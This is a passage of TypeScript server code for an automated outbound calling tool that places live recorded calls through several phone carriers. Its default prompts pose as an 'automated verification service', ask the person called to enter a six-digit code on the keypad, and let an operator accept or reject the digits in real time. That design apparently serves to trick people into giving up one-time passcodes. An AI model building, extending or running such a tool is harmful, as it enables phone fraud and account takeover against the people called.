import 'dotenv/config';
import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import fs from 'fs';
import path from 'path';
import { execFile } from 'child_process';
import { promisify } from 'util';
import { fileURLToPath } from 'url';
import twilio from 'twilio';
import { GoogleGenAI } from '@google/genai';

const execFileAsync = promisify(execFile);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const isProd = process.env.NODE_ENV === 'production';

app.set('trust proxy', true);
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

function isLocalUrl(urlOrHost: string): boolean {
  const lower = urlOrHost.toLowerCase();
  return (
    lower.includes('localhost') ||
    lower.includes('127.0.0.1') ||
    lower.includes('0.0.0.0')
  );
}

function normalizeCallerId(raw?: string): string {
  if (!raw || !raw.trim()) return '';
  const digits = raw.replace(/\D/g, '');
  if (!digits) return '';
  if (digits.length === 10) return `+1${digits}`;
  if (digits.length === 11 && digits.startsWith('1')) return `+${digits}`;
  return `+${digits}`;
}

function isValidPublicHttpUrl(val?: string): boolean {
  if (!val || !val.trim() || val.trim() === 'MY_APP_URL') return false;
  try {
    const parsed = new URL(val.trim());
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
    return !isLocalUrl(parsed.host);
  } catch {
    return false;
  }
}

// Dynamic public base URL helper that auto-detects live production domains (reverse proxy headers, Origin/Referer, stored session base URL, or APP_URL)
export function getPublicBaseUrl(req?: Request, fallbackUrl?: string): string {
  if (req) {
    const rawProto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
    const proto = rawProto.split(',')[0].trim() || 'https';
    const rawHost = (req.headers['x-forwarded-host'] as string) || req.headers.host || '';
    const host = rawHost.split(',')[0].trim();

    if (host && !isLocalUrl(host)) {
      return `${proto}://${host}`.replace(/\/$/, '');
    }

    const candidates = [
      req.body?.clientOrigin,
      req.headers.origin,
      req.headers.referer,
      fallbackUrl,
    ];

    for (const candidate of candidates) {
      if (isValidPublicHttpUrl(candidate)) {
        const parsed = new URL(candidate!.trim());
        return parsed.origin.replace(/\/$/, '');
      }
    }
  } else if (isValidPublicHttpUrl(fallbackUrl)) {
    return new URL(fallbackUrl!.trim()).origin.replace(/\/$/, '');
  }

  if (isValidPublicHttpUrl(process.env.APP_URL)) {
    return new URL(process.env.APP_URL!.trim()).origin.replace(/\/$/, '');
  }

  return `http://localhost:${PORT}`;
}

export interface SpeechTranscriptEntry {
  id: string;
  text: string;
  confidence?: number;
  timestamp: string;
}

export interface CallSession {
  id: string;
  to: string;
  from: string;
  status: 'queued' | 'initiating' | 'ringing' | 'in-progress' | 'collecting-input' | 'awaiting-operator' | 'completed' | 'busy' | 'failed' | 'no-answer';
  answeredBy?: 'human' | 'voicemail' | 'fax' | 'unknown';
  amdRawResult?: string;
  autoHangupOnVoicemail?: boolean;
  promptsStarted?: boolean;
  humanPickedUpAfterVoicemail?: boolean;
  answeredAt?: string;
  voicemailDetectedAt?: string;
  voicemailGreetingComplete?: boolean;
  silentPollCount?: number;
  recordCall?: boolean;
  recordingUrl?: string;
  providerRecordingUrl?: string;
  recordingSid?: string;
  recordingDuration?: number;
  recordingSizeBytes?: number;
  recordingStatus?: 'recording' | 'completed' | 'failed';
  localRecordingExt?: string;
  speechTranscripts?: SpeechTranscriptEntry[];
  introGreeting: string;
  script: string;
  verificationMode: 'manual' | 'auto';
  holdMessage: string;
  expectedCode?: string;
  invalidMessage?: string;
  successMessage?: string;
  maxAttempts?: number;
  attempts?: number;
  codeStatus?: 'pending' | 'awaiting_operator' | 'valid' | 'invalid' | 'max_exceeded';
  pendingDigits?: string;
  operatorDecision?: 'pending' | 'approved' | 'rejected';
  activeCue?: { text: string; timestamp: string };
  lastInvalidDigits?: string;
  voice: string;
  inputMode: 'dtmf' | 'speech' | 'dtmf speech';
  numDigits: number;
  keypadActions: Record<string, string>;
  capturedDigits?: string;
  capturedSpeech?: string;
  confidence?: number;
  duration?: number;
  isSimulated: boolean;
  carrier?: 'twilio' | 'plivo' | 'telnyx' | 'signalwire' | 'fonoster';
  providerCallSid?: string;
  publicBaseUrl?: string;
  waitPollCount?: number;
  createdAt: string;
  completedAt?: string;
  events: Array<{
    id: string;
    timestamp: string;
    type: 'system' | 'call-state' | 'playback' | 'gather' | 'dtmf' | 'speech' | 'amd' | 'recording' | 'error';
    title: string;
    description: string;
    data?: any;
  }>;
}

// Persistent /tmp storage for sessions, recordings, and server-only carrier auth headers
const SESSION_CACHE_FILE = '/tmp/voicedrop-sessions.json';
const CREDENTIALS_CACHE_FILE = '/tmp/voicedrop-credentials.json';
const RECORDINGS_DIR = '/tmp/voicedrop-recordings';

try {
  fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
} catch {
  // Ignore if already exists
}

interface StoredCallCredentials {
  carrier: string;
  authHeader?: string;
  twilioSid?: string;
  twilioToken?: string;
  plivoId?: string;
  plivoToken?: string;
  telnyxKey?: string;
  swSpace?: string;
  swProject?: string;
  swToken?: string;
}

const sessions = new Map<string, CallSession>();
const providerSidToCallId = new Map<string, string>();
const callCredentialsMap = new Map<string, StoredCallCredentials>();

function saveCallCredentials(callId: string, creds: StoredCallCredentials) {
  callCredentialsMap.set(callId, creds);
  try {
    const entries = Object.fromEntries(Array.from(callCredentialsMap.entries()).slice(-50));
    fs.writeFileSync(CREDENTIALS_CACHE_FILE, JSON.stringify(entries), { encoding: 'utf8', mode: 0o600 });
  } catch {
    // Ignore disk cache errors
  }
}

function getCallCredentials(callId: string): StoredCallCredentials | undefined {
  if (callCredentialsMap.has(callId)) return callCredentialsMap.get(callId);
  try {
    if (fs.existsSync(CREDENTIALS_CACHE_FILE)) {
      const raw = JSON.parse(fs.readFileSync(CREDENTIALS_CACHE_FILE, 'utf8'));
      if (raw && typeof raw === 'object') {
        for (const [k, v] of Object.entries(raw)) {
          callCredentialsMap.set(k, v as StoredCallCredentials);
        }
      }
    }
  } catch {
    // Ignore read errors
  }
  return callCredentialsMap.get(callId);
}

function persistSessionsToDisk() {
  try {
    const list = Array.from(sessions.values()).slice(-50);
    fs.writeFileSync(SESSION_CACHE_FILE, JSON.stringify(list), 'utf8');
  } catch {
    // Ignore disk cache errors in restricted environments
  }
}

function hydrateSessionsFromDisk() {
  try {
    if (!fs.existsSync(SESSION_CACHE_FILE)) return;
    const raw = fs.readFileSync(SESSION_CACHE_FILE, 'utf8');
    const list = JSON.parse(raw) as CallSession[];
    if (Array.isArray(list)) {
      for (const s of list) {
        if (s?.id && !sessions.has(s.id)) {
          sessions.set(s.id, s);
        }
        if (s?.id && s?.providerCallSid) {
          providerSidToCallId.set(s.providerCallSid, s.id);
        }
      }
    }
  } catch {
    // Ignore parse/read errors
  }
}

hydrateSessionsFromDisk();

function getSessionById(idOrSid?: string): CallSession | undefined {
  if (!idOrSid) return undefined;
  const key = idOrSid.trim();
  if (!key) return undefined;

  if (sessions.has(key)) return sessions.get(key);
  const mappedId = providerSidToCallId.get(key);
  if (mappedId && sessions.has(mappedId)) return sessions.get(mappedId);

  hydrateSessionsFromDisk();
  if (sessions.has(key)) return sessions.get(key);
  const mappedAfterHydrate = providerSidToCallId.get(key);
  if (mappedAfterHydrate && sessions.has(mappedAfterHydrate)) {
    return sessions.get(mappedAfterHydrate);
  }

  return Array.from(sessions.values()).find(
    (s) => s.id === key || s.providerCallSid === key
  );
}

// Active Server-Sent Event clients per callId
const sseClients = new Map<string, Set<Response>>();

function broadcastEvent(callId: string, eventName: string, data: any) {
  const clients = sseClients.get(callId);
  if (clients && clients.size > 0) {
    const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const res of clients) {
      try {
        res.write(payload);
      } catch (err) {
        console.error('Error writing SSE to client:', err);
      }
    }
  }
}

function addSessionEvent(session: CallSession, event: Omit<CallSession['events'][0], 'id' | 'timestamp'>) {
  const fullEvent = {
    ...event,
    id: `evt-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    timestamp: new Date().toISOString(),
  };
  session.events.push(fullEvent);
  persistSessionsToDisk();
  broadcastEvent(session.id, 'call-event', fullEvent);
  broadcastEvent(session.id, 'session-update', session);
  return fullEvent;
}

// System configuration endpoint
app.get('/api/config', (req: Request, res: Response) => {
  const accountSid = process.env.TWILIO_ACCOUNT_SID || '';
  const authToken = process.env.TWILIO_AUTH_TOKEN || '';
  const phoneNumber = process.env.TWILIO_PHONE_NUMBER || '';
  const appUrl = getPublicBaseUrl(req);
  const rawGeminiKey = (process.env.GEMINI_API_KEY || '').trim();
  const hasGemini = Boolean(rawGeminiKey && rawGeminiKey !== 'MY_GEMINI_API_KEY');

  res.json({
    hasTwilioAccountSid: Boolean(accountSid.trim()),
    hasTwilioAuthToken: Boolean(authToken.trim()),
    hasTwilioPhoneNumber: Boolean(phoneNumber.trim()),
    isTwilioConfigured: Boolean(accountSid.trim() && authToken.trim() && phoneNumber.trim()),
    configuredPhoneNumber: phoneNumber ? `${phoneNumber.slice(0, 5)}...${phoneNumber.slice(-4)}` : null,
    appUrl,
    hasGemini,
  });
});

// Server-Sent Events stream for real-time call telemetry
app.get('/api/call/events/:callId', (req: Request, res: Response) => {
  const { callId } = req.params;

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no',
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', callId })}\n\n`);

  if (!sseClients.has(callId)) {
    sseClients.set(callId, new Set());
  }
  sseClients.get(callId)!.add(res);

  // Send initial session data if already exists
  const session = getSessionById(callId);
  if (session) {
    res.write(`event: session-update\ndata: ${JSON.stringify(session)}\n\n`);
  }

  // Heartbeat ping every 15 seconds to keep connection alive
  const heartbeat = setInterval(() => {
    res.write(': heartbeat\n\n');
  }, 15000);

  req.on('close', () => {
    clearInterval(heartbeat);
    const clientSet = sseClients.get(callId);
    if (clientSet) {
      clientSet.delete(res);
      if (clientSet.size === 0) {
        sseClients.delete(callId);
      }
    }
  });
});

// Get session details (auto-reconciles cached recordings on disk)
function reconcileSessionRecordingState(s: CallSession): CallSession {
  const cached = findCachedRecordingPath(s.id);
  if (cached) {
    try {
      const stat = fs.statSync(cached.filePath);
      if (stat.size > 0) {
        s.recordingSizeBytes = stat.size;
        s.recordingStatus = 'completed';
        if (!s.recordingUrl) {
          s.recordingUrl = `/api/calls/${encodeURIComponent(s.id)}/recording?v=${stat.size}`;
        }
      }
    } catch {
      // Ignore stat error
    }
  } else if (
    s.recordingStatus === 'recording' &&
    ['completed', 'failed', 'busy', 'no-answer'].includes(s.status) &&
    s.completedAt &&
    Date.now() - new Date(s.completedAt).getTime() > 10000
  ) {
    // Never leave completed calls stuck in 'recording' state
    s.recordingStatus = undefined;
  }
  return s;
}

app.get('/api/calls/:callId', (req: Request, res: Response) => {
  const session = getSessionById(req.params.callId);
  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }
  res.json(reconcileSessionRecordingState(session));
});

// List recent calls
app.get('/api/calls', (req: Request, res: Response) => {
  const list = Array.from(sessions.values())
    .map((s) => reconcileSessionRecordingState(s))
    .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
  res.json(list.slice(0, 25));
});

// Initiate Call endpoint
app.post('/api/call/initiate', async (req: Request, res: Response) => {
  try {
    const {
      to,
      introGreeting = 'Hello, thank you for answering. This is an automated verification service.',
      message,
      verificationMode = 'manual',
      holdMessage = 'Kindly hold while your information is being processed.',
      expectedCode,
      invalidMessage = 'That code is incorrect. Please re-enter your code on your keypad now, followed by the pound sign.',
      successMessage = 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.',
      maxAttempts = 3,
      voice = 'Polly.Joanna',
      numDigits = 6,
      keypadActions = {},
      autoHangupOnVoicemail = false,
      recordCall = true,
      mode = 'auto', // 'live' | 'simulator' | 'auto'
      customTwilio,
    } = req.body;

    if (!to || !message) {
      return res.status(400).json({ error: 'Target phone number and voice prompt are required.' });
    }

    // Clean & validate target phone number to E.164 (+1XXXXXXXXXX)
    const digitsOnly = to.replace(/\D/g, '');
    let formattedTo = to.trim();
    if (digitsOnly.length === 10) {
      formattedTo = `+1${digitsOnly}`;
    } else if (digitsOnly.length === 11 && digitsOnly.startsWith('1')) {
      formattedTo = `+${digitsOnly}`;
    }

    const e164Regex = /^\+1[2-9]\d{9}$/;
    if (!e164Regex.test(formattedTo)) {
      return res.status(400).json({
        error: `Invalid US phone number: "${to}". Must be a valid 10-digit US number (+1 [2-9]XX-XXX-XXXX).`,
      });
    }

    // Resolve Active Carrier and Credentials
    const carrier: 'twilio' | 'plivo' | 'telnyx' | 'signalwire' | 'fonoster' =
      req.body.carrier || req.body.carriersConfig?.activeCarrier || 'twilio';
    const carriersConfig = req.body.carriersConfig || {};

    let canUseLiveCarrier = false;
    let carrierPhone = '+18005550199';

    // Twilio
    const twilioAccountSid = carriersConfig.twilio?.accountSid || customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
    const twilioAuthToken = carriersConfig.twilio?.authToken || customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
    const twilioPhone = normalizeCallerId(carriersConfig.twilio?.phoneNumber || customTwilio?.phoneNumber || process.env.TWILIO_PHONE_NUMBER);

    // Plivo
    const plivoAuthId = carriersConfig.plivo?.authId || process.env.PLIVO_AUTH_ID;
    const plivoAuthToken = carriersConfig.plivo?.authToken || process.env.PLIVO_AUTH_TOKEN;
    const plivoPhone = normalizeCallerId(carriersConfig.plivo?.phoneNumber || process.env.PLIVO_PHONE_NUMBER);

    // Telnyx
    const telnyxApiKey = carriersConfig.telnyx?.apiKey || process.env.TELNYX_API_KEY;
    const telnyxConnectionId = carriersConfig.telnyx?.connectionId || process.env.TELNYX_CONNECTION_ID;
    const telnyxPhone = normalizeCallerId(carriersConfig.telnyx?.phoneNumber || process.env.TELNYX_PHONE_NUMBER);

    // SignalWire
    const signalwireSpaceUrl = carriersConfig.signalwire?.spaceUrl || process.env.SIGNALWIRE_SPACE_URL;
    const signalwireProjectId = carriersConfig.signalwire?.projectId || process.env.SIGNALWIRE_PROJECT_ID;
    const signalwireApiToken = carriersConfig.signalwire?.apiToken || process.env.SIGNALWIRE_API_TOKEN;
    const signalwirePhone = normalizeCallerId(carriersConfig.signalwire?.phoneNumber || process.env.SIGNALWIRE_PHONE_NUMBER);

    // Fonoster
    const fonosterProjectId = carriersConfig.fonoster?.projectId || process.env.FONOSTER_PROJECT_ID;
    const fonosterAccessKeyId = carriersConfig.fonoster?.accessKeyId || process.env.FONOSTER_ACCESS_KEY_ID;
    const fonosterAccessKeySecret = carriersConfig.fonoster?.accessKeySecret || process.env.FONOSTER_ACCESS_KEY_SECRET;
    const fonosterPhone = normalizeCallerId(carriersConfig.fonoster?.phoneNumber || process.env.FONOSTER_PHONE_NUMBER);

    if (carrier === 'twilio') {
      canUseLiveCarrier = Boolean(twilioAccountSid && twilioAuthToken && twilioPhone);
      carrierPhone = twilioPhone || carrierPhone;
    } else if (carrier === 'plivo') {
      canUseLiveCarrier = Boolean(plivoAuthId && plivoAuthToken && plivoPhone);
      carrierPhone = plivoPhone || carrierPhone;
    } else if (carrier === 'telnyx') {
      canUseLiveCarrier = Boolean(telnyxApiKey && telnyxConnectionId && telnyxPhone);
      carrierPhone = telnyxPhone || carrierPhone;
    } else if (carrier === 'signalwire') {
      canUseLiveCarrier = Boolean(signalwireSpaceUrl && signalwireProjectId && signalwireApiToken && signalwirePhone);
      carrierPhone = signalwirePhone || carrierPhone;
    } else if (carrier === 'fonoster') {
      canUseLiveCarrier = Boolean(fonosterProjectId && fonosterAccessKeyId && fonosterAccessKeySecret && fonosterPhone);
      carrierPhone = fonosterPhone || carrierPhone;
    }

    const useSimulator = mode === 'simulator' || (mode === 'auto' && !canUseLiveCarrier);

    if (mode === 'live' && !canUseLiveCarrier) {
      return res.status(400).json({
        error: `${carrier.toUpperCase()} credentials not configured. Please supply required API keys in Carrier Settings, or select Simulator mode.`,
      });
    }

    const callId = `call_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
    const appBaseUrl = getPublicBaseUrl(req);
    const shouldRecord = recordCall !== false;

    const newSession: CallSession = {
      id: callId,
      to: formattedTo,
      from: carrierPhone,
      status: 'queued',
      autoHangupOnVoicemail: Boolean(autoHangupOnVoicemail),
      recordCall: shouldRecord,
      speechTranscripts: [],
      introGreeting: introGreeting.trim(),
      script: message.trim(),
      verificationMode: verificationMode === 'auto' ? 'auto' : 'manual',
      holdMessage: holdMessage.trim(),
      expectedCode: expectedCode ? expectedCode.trim() : undefined,
      invalidMessage: invalidMessage.trim(),
      successMessage: successMessage.trim(),
      maxAttempts: Number(maxAttempts) || 3,
      attempts: 0,
      codeStatus: 'pending',
      voice,
      inputMode: 'dtmf speech',
      numDigits: Number(numDigits) || (expectedCode ? expectedCode.trim().length : 6),
      keypadActions: keypadActions || {},
      isSimulated: useSimulator,
      carrier,
      publicBaseUrl: appBaseUrl,
      createdAt: new Date().toISOString(),
      events: [],
    };

    sessions.set(callId, newSession);

    addSessionEvent(newSession, {
      type: 'system',
      title: 'Call Session Created (AMD + Voice Listener + Recording Active)',
      description: `Target: ${formattedTo}. Control: ${newSession.verificationMode === 'manual' ? 'Manual Operator Verification' : 'Automatic Match'}. Digits: ${newSession.numDigits}. Carrier: ${carrier.toUpperCase()} (${useSimulator ? 'Simulator' : 'Live PSTN'})`,
      data: { to: formattedTo, voice, numDigits: newSession.numDigits, verificationMode: newSession.verificationMode, carrier, recordCall: shouldRecord },
    });

    if (useSimulator) {
      setTimeout(() => {
        const s = sessions.get(callId);
        if (s && s.status === 'queued') {
          s.status = 'initiating';
          addSessionEvent(s, {
            type: 'call-state',
            title: 'Initiating Outbound Handshake',
            description: `Connecting route to local carrier switch for ${formattedTo}...`,
          });
        }
      }, 600);

      setTimeout(() => {
        const s = sessions.get(callId);
        if (s && s.status === 'initiating') {
          s.status = 'ringing';
          addSessionEvent(s, {
            type: 'call-state',
            title: 'Ringing Recipient Phone',
            description: 'Destination terminal is ringing. Waiting for human or voicemail answer...',
          });
        }
      }, 1800);

      return res.json({
        success: true,
        callId,
        session: newSession,
        mode: 'simulator',
        message: 'Simulator call initialized and ringing. Answer or send to Voicemail on the Phone Simulator!',
      });
    }

    // LIVE PSTN CARRIER DISPATCH
    try {
      if (carrier === 'twilio') {
        saveCallCredentials(callId, {
          carrier: 'twilio',
          authHeader: `Basic ${Buffer.from(`${twilioAccountSid}:${twilioAuthToken}`).toString('base64')}`,
          twilioSid: twilioAccountSid,
          twilioToken: twilioAuthToken,
        });

        const client = twilio(twilioAccountSid, twilioAuthToken);
        const outboundUrl = `${appBaseUrl}/api/twiml/outbound?callId=${encodeURIComponent(callId)}`;
        const statusCallbackUrl = `${appBaseUrl}/api/twiml/status?callId=${encodeURIComponent(callId)}`;
        const amdCallbackUrl = `${appBaseUrl}/api/twiml/amd?callId=${encodeURIComponent(callId)}`;
        const recordingCallbackUrl = `${appBaseUrl}/api/twiml/recording?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Twilio API Request',
          description: `Calling Twilio Programmable Voice with Async Voicemail Detection (AMD) & Call Recording enabled: ${outboundUrl}`,
        });

        const createParams: any = {
          to: formattedTo,
          from: twilioPhone,
          url: outboundUrl,
          statusCallback: statusCallbackUrl,
          statusCallbackEvent: ['initiated', 'ringing', 'answered', 'completed'],
          statusCallbackMethod: 'POST',
          machineDetection: 'Enable',
          machineDetectionTimeout: 8,
          machineDetectionSpeechThreshold: 1900,
          machineDetectionSpeechEndThreshold: 1000,
          machineDetectionSilenceTimeout: 2500,
          asyncAmd: 'true',
          asyncAmdStatusCallback: amdCallbackUrl,
          asyncAmdStatusCallbackMethod: 'POST',
        };

        if (shouldRecord) {
          createParams.record = true;
          createParams.recordingChannels = 'mono';
          createParams.trim = 'trim-silence';
          createParams.recordingStatusCallback = recordingCallbackUrl;
          createParams.recordingStatusCallbackEvent = ['in-progress', 'completed', 'absent'];
          createParams.recordingStatusCallbackMethod = 'POST';
          newSession.recordingStatus = 'recording';
        }

        const call = await client.calls.create(createParams);

        newSession.providerCallSid = call.sid;
        providerSidToCallId.set(call.sid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'Twilio Call Dispatched',
          description: `Twilio Call SID: ${call.sid}. Voicemail detection & full-call audio recording active.`,
          data: { callSid: call.sid, status: call.status },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: call.sid,
          session: newSession,
          mode: 'live',
          carrier: 'twilio',
          message: `Live Twilio call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'plivo') {
        const plivoBasic = `Basic ${Buffer.from(`${plivoAuthId}:${plivoAuthToken}`).toString('base64')}`;
        saveCallCredentials(callId, {
          carrier: 'plivo',
          authHeader: plivoBasic,
          plivoId: plivoAuthId,
          plivoToken: plivoAuthToken,
        });

        const answerUrl = `${appBaseUrl}/api/plivo/outbound?callId=${encodeURIComponent(callId)}`;
        const statusUrl = `${appBaseUrl}/api/plivo/status?callId=${encodeURIComponent(callId)}`;
        const amdUrl = `${appBaseUrl}/api/plivo/amd?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Plivo Voice API Request',
          description: `Calling Plivo endpoint with AMD & Recording active: ${answerUrl}`,
        });

        const plivoRes = await fetch(`https://api.plivo.com/v1/Account/${plivoAuthId}/Call/`, {
          method: 'POST',
          headers: {
            Authorization: plivoBasic,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            from: plivoPhone,
            to: formattedTo,
            answer_url: answerUrl,
            answer_method: 'POST',
            hangup_url: statusUrl,
            hangup_method: 'POST',
            machine_detection: 'true',
            machine_detection_time: 5000,
            machine_detection_url: amdUrl,
            machine_detection_method: 'POST',
          }),
        });

        const plivoData: any = await plivoRes.json();
        if (!plivoRes.ok) {
          throw new Error(plivoData.message || plivoData.error || 'Plivo API call failed');
        }

        const callSid = plivoData.request_uuid || plivoData.call_uuid || callId;
        newSession.providerCallSid = callSid;
        if (shouldRecord) newSession.recordingStatus = 'recording';
        providerSidToCallId.set(callSid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'Plivo Call Dispatched',
          description: `Plivo Request UUID: ${callSid}. Call queued with AMD & Recording.`,
          data: { callSid },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: callSid,
          session: newSession,
          mode: 'live',
          carrier: 'plivo',
          message: `Live Plivo call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'telnyx') {
        saveCallCredentials(callId, {
          carrier: 'telnyx',
          authHeader: `Bearer ${telnyxApiKey}`,
          telnyxKey: telnyxApiKey,
        });

        const texmlUrl = `${appBaseUrl}/api/telnyx/texml?callId=${encodeURIComponent(callId)}`;
        const statusUrl = `${appBaseUrl}/api/telnyx/status?callId=${encodeURIComponent(callId)}`;
        const amdUrl = `${appBaseUrl}/api/telnyx/amd?callId=${encodeURIComponent(callId)}`;
        const recUrl = `${appBaseUrl}/api/telnyx/recording?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Telnyx TeXML Call',
          description: `Calling Telnyx TeXML endpoint with AMD & Recording: ${texmlUrl}`,
        });

        const telnyxPayload: any = {
          to: formattedTo,
          from: telnyxPhone,
          url: texmlUrl,
          status_callback: statusUrl,
          connection_id: telnyxConnectionId,
          answering_machine_detection: 'detect',
          async_amd: true,
          async_amd_status_callback: amdUrl,
          async_amd_status_callback_method: 'POST',
        };

        if (shouldRecord) {
          telnyxPayload.record = 'record-from-answer';
          telnyxPayload.recording_channels = 'single';
          telnyxPayload.recording_format = 'wav';
          telnyxPayload.recording_status_callback = recUrl;
          telnyxPayload.recording_status_callback_method = 'POST';
          newSession.recordingStatus = 'recording';
        }

        const telnyxRes = await fetch('https://api.telnyx.com/v2/texml/calls', {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${telnyxApiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(telnyxPayload),
        });

        const telnyxData: any = await telnyxRes.json();
        if (!telnyxRes.ok) {
          throw new Error(telnyxData.errors?.[0]?.detail || telnyxData.message || 'Telnyx call failed');
        }

        const callSid = telnyxData.data?.call_control_id || telnyxData.data?.call_leg_id || callId;
        newSession.providerCallSid = callSid;
        providerSidToCallId.set(callSid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'Telnyx Call Dispatched',
          description: `Telnyx Call Control ID: ${callSid}.`,
          data: { callSid },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: callSid,
          session: newSession,
          mode: 'live',
          carrier: 'telnyx',
          message: `Live Telnyx call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'signalwire') {
        const cleanSpace = (signalwireSpaceUrl || '').replace(/^https?:\/\//, '').replace(/\/$/, '');
        const swBasic = `Basic ${Buffer.from(`${signalwireProjectId}:${signalwireApiToken}`).toString('base64')}`;
        saveCallCredentials(callId, {
          carrier: 'signalwire',
          authHeader: swBasic,
          swSpace: cleanSpace,
          swProject: signalwireProjectId,
          swToken: signalwireApiToken,
        });

        const lamlUrl = `${appBaseUrl}/api/signalwire/laml?callId=${encodeURIComponent(callId)}`;
        const statusUrl = `${appBaseUrl}/api/signalwire/status?callId=${encodeURIComponent(callId)}`;
        const amdUrl = `${appBaseUrl}/api/signalwire/amd?callId=${encodeURIComponent(callId)}`;
        const recUrl = `${appBaseUrl}/api/signalwire/recording?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching SignalWire Compatibility Call',
          description: `Calling SignalWire Space [${cleanSpace}] with AMD & Recording: ${lamlUrl}`,
        });

        const swParams: Record<string, string> = {
          To: formattedTo,
          From: signalwirePhone || '',
          Url: lamlUrl,
          StatusCallback: statusUrl,
          MachineDetection: 'Enable',
          MachineDetectionTimeout: '8',
          MachineDetectionSpeechThreshold: '1900',
          MachineDetectionSpeechEndThreshold: '1000',
          MachineDetectionSilenceTimeout: '2500',
          AsyncAmd: 'true',
          AsyncAmdStatusCallback: amdUrl,
          AsyncAmdStatusCallbackMethod: 'POST',
        };

        if (shouldRecord) {
          swParams.Record = 'true';
          swParams.RecordingChannels = 'mono';
          swParams.Trim = 'trim-silence';
          swParams.RecordingStatusCallback = recUrl;
          swParams.RecordingStatusCallbackEvent = 'in-progress completed absent';
          swParams.RecordingStatusCallbackMethod = 'POST';
          newSession.recordingStatus = 'recording';
        }

        const swUrl = `https://${cleanSpace}/api/laml/2010-04-01/Accounts/${signalwireProjectId}/Calls.json`;
        const swRes = await fetch(swUrl, {
          method: 'POST',
          headers: {
            Authorization: swBasic,
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams(swParams).toString(),
        });

        const swData: any = await swRes.json();
        if (!swRes.ok) {
          throw new Error(swData.message || swData.error_message || 'SignalWire API call failed');
        }

        const callSid = swData.sid || callId;
        newSession.providerCallSid = callSid;
        providerSidToCallId.set(callSid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'SignalWire Call Dispatched',
          description: `SignalWire Call SID: ${callSid}. Status: ${swData.status || 'queued'}.`,
          data: { callSid },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: callSid,
          session: newSession,
          mode: 'live',
          carrier: 'signalwire',
          message: `Live SignalWire call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'fonoster') {
        const webhookUrl = `${appBaseUrl}/api/fonoster/webhook?callId=${encodeURIComponent(callId)}`;
        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Fonoster Voice Application',
          description: `Fonoster Voice webhook active: ${webhookUrl}`,
        });

        return res.json({
          success: true,
          callId,
          session: newSession,
          mode: 'live',
          carrier: 'fonoster',
          message: `Fonoster call routing configured. Listening for webhook events!`,
        });
      }
    } catch (carrierErr: any) {
      console.error(`${carrier.toUpperCase()} Call Error:`, carrierErr);
      newSession.status = 'failed';
      addSessionEvent(newSession, {
        type: 'error',
        title: `${carrier.toUpperCase()} Carrier Dispatch Error`,
        description: carrierErr.message || `Failed to initiate ${carrier} voice call.`,
        data: carrierErr,
      });

      return res.status(500).json({
        error: `${carrier.toUpperCase()} call failed: ${carrierErr.message || 'Unknown carrier error'}`,
        callId,
        session: newSession,
      });
    }
  } catch (error: any) {
    console.error('Call initiation error:', error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});

// Helper to escape XML characters
function escapeXml(unsafe: string): string {
  if (!unsafe) return '';
  return String(unsafe).replace(/[<>&'"]/g, (c) => {
    switch (c) {
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '&': return '&amp;';
      case '\'': return '&apos;';
      case '"': return '&quot;';
      default: return c;
    }
  });
}

// Helper to find session by checking ALL candidate identifier keys across carriers + active phone fallback
function findSession(req: Request): CallSession | undefined {
  const candidates = [
    req.query?.callId,
    req.body?.CallSid,
    req.body?.ParentCallSid,
    req.body?.CallUUID,
    req.body?.RequestUUID,
    req.body?.call_control_id,
    req.body?.call_leg_id,
    req.body?.callId,
    req.body?.id,
  ]
    .map((v) => (typeof v === 'string' ? v.trim() : ''))
    .filter(Boolean);

  for (const key of candidates) {
    const found = getSessionById(key);
    if (found) return found;
  }

  // Fallback: if carrier webhook omitted query params, match most recent session for recipient phone
  const rawTo = req.body?.To || req.body?.Called || req.query?.To;
  if (typeof rawTo === 'string' && rawTo.trim()) {
    const normTo = normalizeCallerId(rawTo);
    const activeByPhone = Array.from(sessions.values())
      .filter(
